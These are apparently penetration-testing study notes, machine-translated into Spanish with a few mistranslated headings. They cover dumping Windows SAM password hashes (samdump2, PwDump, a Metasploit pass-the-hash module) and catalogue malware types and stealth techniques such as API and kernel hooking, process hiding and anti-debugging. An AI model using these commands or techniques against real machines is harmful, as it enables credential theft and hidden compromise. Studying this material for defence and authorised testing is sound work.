→ Aquí necesita acceso físico a la máquina. En este punto hay dos casos:

* Sistema de ejecución: En este caso, se requiere una cuenta de administrador local para descargar hashes de la memoria

```
If you want to steal hashes from a running system, you must have at least Administrator Privileges.
Some situation we cannot reboot the machine of the target For various reasons.
```

De todos modos, si tienes el acceso correcto podemos utilizar algunas herramientas:

```
	PwDump.exe localhost
	fgdump.exe
	SAMinside
	ophcrack
```

* Sistema fuera de línea: En este caso, los hashes de las contraseñas se descifran del archivo de almacenamiento de contraseñas sin conexión SAM. La clave para descifrar SAM se almacena en el archivo SYSTEM. Si tiene acceso físico a la máquina sin conexión, tiene más opciones que solo hashes.

Monte la partición donde está instalado Windows:

```
mkdir /mnt/sda1
mount -t ntfs /dev/sda1 /mnt/sda1
cd /mnt/sda1/WINDOWS/system32/config
```

Con los hashes en la mano:

```
bkhive SYSTEM syskey.txt
samdump2 SAM syskey.txt > dummpedhash.txt
```

```
Ophcrack live CD: <this seems so old>
	just boot and the hashes will appear
	u can grab and crack later
```

* también podemos cambiar el contenido del archivo SAM en lugar de robar chntpw > borrar contraseñas, cambiar contraseñas, promover usuarios a administradores
* Omitir el inicio de sesión de Windows kon-boot es un software que permite cambiar el contenido de un kernel de Linux y Windows Permite iniciar sesión en un sistema como usuario root sin escribir la contraseña correcta o elevar los privilegios del usuario actual a root.

#### ¿Qué hacer con Hashes? <a href="#what-to-do-with-hashes" id="what-to-do-with-hashes"></a>

→ Pasa el hachís

Con Metasploit:

```
exploit/windows/smb/psexec
set options
if you do not have both LM and NT hashes you can set one of them with 32 0''s.
0000000:hash
```

→ Descifra el hachís

```
<user>:<hash>
john
ophcrack
Hashcat
RainbowCrack
```

## Malware <a href="#malware" id="malware"></a>

### Malware = Software malintencionado <a href="#malware--malicious-software" id="malware--malicious-software"></a>

#### Virus <a href="#virus" id="virus"></a>

```
A computer virus is a computer program that copies itself and spreads without the permission or knowledge of the owner.
```

Residente: se convierte en residente de memoria (y espera para algunos disparadores, como la carga de otro programa). Luego infecta otros programas y así sucesivamente.

No residente: buscará archivos que pueda infectar. Después de infectarlos, se detendrá. Cuando el programa infect se ejecute de nuevo, volverá a encontrar nuevos objetivos y así sucesivamente.

Sector de arranque: se propaga a través de los sectores de arranque. Si se deja un CD infectado en el sistema, después del arranque infectará el disco duro y otros controladores.

Multipartito: Tiene pocos tipos de mecanismos de infección, como los que tienen tanto de tipo boot-secot como de tipo residente o incluso más.

#### Caballo de Troya <a href="#trojan-horse" id="trojan-horse"></a>

```
It looks like will perform a function byt in fact facilitates unauthorized access to the ownwes system.
like the greek mythology
They are not self-replicating unlike viruses.
```

#### Rootkit <a href="#rootkit" id="rootkit"></a>

```
Designed to hide the fact that a compromise has already been done or to do the compromise at a deeper level.
rootkit is used as a supplement to other malware.
can be used to hide processes, files, implement backdoors and/or create loopholes.
they are installed as drivers ( or kernel modules).
```

Nivel de aplicación: Sustituyen los programas reales por copias de otros programas.

Nivel de biblioteca: Ejemplo: Área de 10 aplicaciones Al compartir una biblioteca, tomar el control de la biblioteca significa tomar el control de las 10 aplicaciones.

Nivel de kernel: tipo más común. conocidos por su resistencia a la eliminación, ya que se ejecutan con el mismo nivel de privilegio en el que se ejecutan las soluciones antivirus.

Nivel de hipervisor: Las CPU ofrecen soporte para la virtualización. Los rootkits que utilizan estas tecnologías específicas del procesador se denominan rootkits de hipervisor: por ejemplo, blue-pill y subvirt.

Nivel de firmware: rootkits Para BIOS, tablas ACPI o ROMS de dispositivos. Alta probabilidad de supervivencia porque, actualmente, no existen herramientas para verificar/escanear los rootkits a nivel de firmware.

#### Bootkit <a href="#bootkit" id="bootkit"></a>

```
like rootkits, but grab the OS during the boot process itself
they start attacking the OS when the OS has not even started, so they are able to completely violate the security of the targer operation system.
```

#### Puerta trasera <a href="#backdoor" id="backdoor"></a>

```
software that helps bypassing authentication mechanism, keeping remote access open ( For later use) which trying to remain hidden.
```

#### Adware <a href="#adware" id="adware"></a>

```
advertising supported software which displays ads from time-to-time during the use of the software.
can be a spyware.
also install unwanted software, which can be a malware.
```

#### Spyware <a href="#spyware" id="spyware"></a>

```
software that keeps spying the user activities, collecting informations without consent.
the informations is sent to the attacker
usually has other kinds of malwares to hide the tracks and to keep in control of the machine.
```

#### Greyware <a href="#greyware" id="greyware"></a>

```
spyware + adware
```

#### Marcador <a href="#dialer" id="dialer"></a>

```
software that connect to premium numbers which are charged highly.
so the attacker makes money
```

#### Registrador de teclas <a href="#key-logger" id="key-logger"></a>

```
keep a log of key been pressed by the user, so it can steal information, passwords, etc
```

Registrador de teclas de software: keyloggers en modo kernel o modo de usuario

Registrador de teclas de hardware: El keylogger basado en firmware se puede colocar en el BIOS

```
PS/2 and USB keyboards can be sniffed with an additional devide placed between the keyboard port and CPU.
```

Rastreador de teclado inalámbrico: Los rastreadores pasivos se pueden utilizar para recopilar datos del teclado en el caso de los teclados inalámbricos

Keylogger acústico: basado en el sonido que se produce cuando el usuario pulsa una tecla. Después de un tiempo de registro de datos, se pueden distinguir patrones claros cuando se presiona o suelta una tecla, lo que conduce a un registro de teclas pasivo remoto.

Keylogger óptico: persona que está a tu lado. utilizado para robar PIN o contraseñas de cajeros automáticos

#### Botnet <a href="#botnet" id="botnet"></a>

```
Collection of compromised computers which run commands automatically and autonomously.
typically created when a number of clients install the same malware
the control of bonet is called bot master, and is usually the one who gives commands to the bots
DOS, send SPAM, etc
```

#### Ransomware <a href="#ransomware" id="ransomware"></a>

```
Locks down files with a password then demands money to unlock the files.
also called Extortive Malware.
```

#### Malware de robo de datos <a href="#data-stealing-malware" id="data-stealing-malware"></a>

```
steal data such as private encryption keys, credit-card data, competitors data such as internal secret algorithms, new product designs and other internal data which could be used by third party.
can be highly targeted and never detected
```

#### Gusano <a href="#worm" id="worm"></a>

```
Software which use network/system vulnerabilities to spread themselves from system to system
normally an entry point into the system
can be local or remote, and can provide access to other malwares
```

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/15.png)

### Técnicas utilizadas por el malware <a href="#techniques-used-by-malware" id="techniques-used-by-malware"></a>

Métodos de cobertura:

* Arroyos
* Enganche de Apis / SSDT nativas
* Enganche de IRP

#### Arroyos <a href="#streams" id="streams"></a>

```
Are a feature of NTFS file system
Microsoft calls them Alternate Data Stream
Alternate Data stream can be used to stored file meta data / or any other data.
it has no name (all other streams have a name).
```

ejemplo en Windows:

```
	echo 'this data is hidden in the stream' >> sample.txt:hstream
	it should appear the file with 0 bytes
	more < sample.txt:hstream
```

#### SSDT - Tabla de descriptores de servicio del sistema <a href="#ssdt---system-service-descriptor-table" id="ssdt---system-service-descriptor-table"></a>

```
Native API is API which resides in ntdll.dll and is used to communicate with kernel mode.
This communication happens using SSDT table.
For each entry in SSDT table, there is a suitable function in kernel mode which completes the task specified by the API. somethin like that:    → User mode Native API < SSDT Table > Kernel mode
```

La tabla SSDT reside en el kernel y se exporta como KeServiceDescriptorTable Servicios disponibles Para la lectura/escritura de archivos: NtOpenFile NtCreateFile NtReadFile NtWriteFile NtQueryDirectoryFile (se usa para consultar el contenido del directorio)

* Enganchar significa que enviamos nuestra función maliciosa para que se llamara en lugar de la función real.

1. Entrada de tabla SSDT de enlace correspondiente a NtQueryDirectoryFile
2. Ahora, cada vez que se llame a la función anterior, se llamará a su función
3. Inmediatamente después de que se llame a la función, llame a la función original y obtenga su resultado (lista de directorios)
4. Si el resultado fue correcto, modifique los resultados (oculte el archivo/subdirectorio que desea ocultar)
5. Ahora devuelva los resultados a la persona que llama
6. Estás oculto

> Hoy en día casi todos los antivirus escanean la tabla SSDT en busca de modificaciones (pueden compararla con la copia almacenada en el kernel) y así se puede hacer la detección.

#### Enganche de IRP - Paquetes de solicitud de E/S <a href="#hooking-irp---io-request-packets" id="hooking-irp---io-request-packets"></a>

```
Transmit piece of data from one component to another
Almost everything in the windows kernel use IRPs For example network interface (TCP/UDP, etc), file system, keyboard and mouse and almost all existent drivers.
```

Conviértase en un controlador de filtro: Regístrese en el sistema operativo como un controlador de filtro o un dispositivo conectado.

Enganchar el puntero de función: La matriz es solo una tabla con punteros de función y se puede modificar fácilmente.

ejemplo:

```
	old_power_irp = DriverObject->MajorFunction[IRP_MK_POWER];
	Driverobject->MajorFunction[ IRP_MK_POWER] = my_new_irp;
```

El diseño básico de IRP es hacer que después de que se haya creado un IRP, se pase a todos los dispositivos registrados en niveles inferiores.

* Preprocesamiento se realiza cuando llega un IRP
* Post-procesamiento se realiza cuando el IRP ha sido procesado por todos los niveles por debajo del nivel actual.

Cada objeto devide tiene su propia tabla de funciones. El enganche de los punteros de función de dichos objetos se denomina DKOM (Direct Kernel Object Manipulation)

Todos los sistemas de archivos, capas de red, dispositivos como teclado, mouse, etc. Tener tales objetos.

Por ejemplo:

```
	\device\ip
	\device\tcp
	\Device\KeyboardClass0
	\FileSystem\ntfs
```

```
Filter drivers are basically used by antiviruses to get control whenever a new file is written
```

#### Ocultar un proceso <a href="#hiding-a-process" id="hiding-a-process"></a>

```
it requires a combination of different techniques 1. hook NTOpenProcess native API 2. Hide the process from EPROCESS list 3. Unling the structure relative to our process from the list <ActiveProcessLinks> 4. if the driver is loaded, you will also have to unlink it from the <PsLoadedModuleList>
```

#### Enganche de API <a href="#api-hooking" id="api-hooking"></a>

→ IAT = Tabla de direcciones de importación Se utiliza para resolver dependencias en tiempo de ejecución ejemplo: MessageBoxA en Windows, el compilador se vincula automáticamente a user32.dll Esto hace que su programa dependa de user32.dll El enganche IAT consiste en modificar la tabla IAT del ejecutable y sustituir la función por nuestra propia copia

→ EAT = Exportar tabla de direcciones Esta tabla se mantiene en DLL (biblioteca de vínculos dinámicos) Estos archivos contienen funciones de soporte para otros archivos ejecutables La mayoría de las veces, el enlace de EAT se utiliza solo en archivos DLL, mientras que el enlace de IAT se puede realizar tanto en EXE como en DLL.

→ Enganche en línea modifique los primeros bytes del código de la función de destino y reemplácelos con nuestro código que le dice a la IP (puntero de instrucción) que ejecute el código en otro lugar de la memoria Cada vez que se ejecute la función, obtendremos el control de la ejecución; Después de hacer nuestro trabajo, tenemos que llamar a la función original, por lo que tenemos que arreglar la función modificada.

#### Métodos antidepuración <a href="#anti-debugging-methods" id="anti-debugging-methods"></a>

```
Set an exception handler
Cause an exception with INT 2dh
if a debugger is attached and does not pass the exception to us, we get to debug_detected because an exception occurred For sure.
```

#### Anti-máquina virtual <a href="#anti-virtual-machine" id="anti-virtual-machine"></a>

````
security analysts analyzing malwares run the code in virtualized OS
the technique basically work on the SIDT instruction, which returns the IDT table address ``` - Real windows machine always have 0x80 For their MSB - if eax !=0 we are emulating windows ```
````

#### Ofuscación <a href="#obfuscation" id="obfuscation"></a>

Transformar/cambiar un programa para que sea más difícil de analizar mientras se conserva la funcionalidad _La ofuscación de código es utilizada tanto por el malware como por el software legal para protegerse._ La diferencia es que el malware lo usa para evitar la detección o dificultar la ingeniería inversa.

Los motores antivirus se basan en la coincidencia de firmas, por lo que se basan en información puramente sintáctica y pueden ser engañados por tales técnicas.

#### Empacadores <a href="#packers" id="packers"></a>

software que comprime los ejecutables. fueron diseñados para disminuir el tamaño de los archivos ejecutables. Pero los autores de malware reconocieron que la disminución del tamaño del archivo también disminuirá el número de patrones en el archivo, por lo que habrá menos posibilidades de detección por parte del antivirus.

#### Polimorfismo <a href="#polymorphism" id="polymorphism"></a>

```
Aims at performing a given action (or algorithm) through code that mutates and changes every time the action hast to be taken.
making difficult to detect
constamt encoding and variable decryptor
A virus having XOR key to encrypt its variant also falls into polymorphic category
```

#### Metamorphism <a href="#metamorphism" id="metamorphism"></a>

```
it can be defined as polymorphism with polymorphism applied to the decryptor/header as well
```

#### ways to implement: <a href="#ways-to-implement" id="ways-to-implement"></a>

Garbage Insertion: Garbage data/instructions are inserted into the code, For example NOP instructions (\x90) are inserted

* Register exchange: The registers are exchanged in all the instruction.
* Permutation of code blocks: code blocks are randomly shuffled and then fixed up, so that the execution logic is still the same.
* Insertion of jump instructions: Some malware mutate by inserting jumps after instructions (the instruction is also relocated), so that the code flow does not change.
* Instruction substitution: one instruction (or set of instructions) are replaced by 1 or more different instruction which are functionally equivalent to the replaced set.
* Code integration with host: the malware modifies the target executable (which is being infected) by spraying its code in region of the EXE. it can compress the original code (or even damage the file completely) to survive/or not be detected.

### ¿Cómo se propaga el malware? <a href="#how-malware-spreads" id="how-malware-spreads"></a>

* Archivos adjuntos de correo electrónico La ingeniería social debe invitar al usuario a ejecutar el archivo adjunto
* Archivos ya infectados Un virus puede causar una reinfección o infectar otros archivos Una vez que está infectado con un virus, es difícil eliminar la infección del sistema
* Uso compartido de archivos peer-2-peer Hoy en día, alrededor del 30-40% de todos los archivos disponibles en las redes de intercambio de archivos pueden estar infectados con malware Algunos programas que tienen que estar conectados a Internet para funcionar, pasan por el código de interfaz de red que no ha sido verificado por ningún tercero. Pueden contener una puerta trasera oculta (a sabiendas y sin saberlo)
* Sitios Web Las descargas no autorizadas se activan al visitar una página HTML. Esto incluye direcciones de correo electrónico
* Vulnerabilidades del sistema La conexión a Internet / la red local puede pasar virus por vulnerabilidades del sistema operativo Este tipo de ataques se pueden detener mediante el uso de firewalls correctamente configurados o simplemente aplicando parches Pero si el firewall no está configurado correctamente, puede aparecer su propio conjunto de errores Por lo tanto, la mejor manera de estar protegido es actualizar su software lo antes posible

> Sin embargo, no hay 100% de seguridad. incluso si está completamente actualizado.

### Muestras <a href="#samples" id="samples"></a>

* Registrador de teclas Si está pensando en usarlo contra uno de los empleados de su organización objetivo, asegúrese de pedir permiso por escrito durante la fase de negociación de su compromiso. keylogger se utiliza no solo para capturar pulsaciones de teclas, sino también como herramienta de espionaje.
*   Troyano Es fácilmente utilizable con muchas funciones. gustar:

    ```
    open/close cd-rom
    how optional bpm/jpg image
    swap mouse buttons
    start options application
    play music file
    control mouse
    shutdown windows
    show different types of message to user
    download/upload/delete files
    go to an optional URL
    send keystrokes and disables keys
    listen For and send keystrokes
    take a screen-dump
    ```
* Virus La detección se realiza haciendo coincidir los patrones dentro del código del virus con la firma de la base de datos

\
\
